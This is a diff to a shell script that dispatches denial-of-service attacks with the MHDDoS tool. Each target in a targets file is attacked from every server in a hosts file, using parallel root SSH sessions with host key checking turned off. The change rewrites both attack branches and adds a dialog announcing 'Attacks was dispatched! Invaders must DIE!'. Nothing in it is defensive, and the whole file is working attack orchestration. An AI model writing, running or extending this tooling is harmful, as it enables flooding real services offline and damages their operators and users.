@@ -20,10 +20,14 @@ case $MENU_OPTION in
       echo "TARGET: $target"
       echo "THREADS: $threads"
       echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
-      bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $SOCKS_TYPE $threads $PROXY_FILE $RPS $DURATION" \
-       --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
+      while read -r host; do
+        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "root@$host" "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $SOCKS_TYPE $threads $PROXY_FILE $RPS $DURATION" &
+      done < "$SCRIPT_DIR/hosts.txt"
     done < "$SCRIPT_DIR/targets.txt"
 
+    wait
+    dialog --title "Ok" --msgbox "Attacks was dispatched!\nInvaders must DIE!" 6 50
+    exit 0
     ;;
 
 2)
@@ -44,12 +48,14 @@ case $MENU_OPTION in
       echo "TARGET: $target"
       echo "THREADS: $threads"
       echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
-      bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" \
-       --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
+      while read -r host; do
+        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "root@$host" "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" &
+      done < "$SCRIPT_DIR/hosts.txt"
     done < "$SCRIPT_DIR/targets.txt"
-    sleep 2
-    exit
 
+    wait
+    dialog --title "Ok" --msgbox "Attacks was dispatched!\nInvaders must DIE!" 6 50
+    exit 0
     ;;
 
 
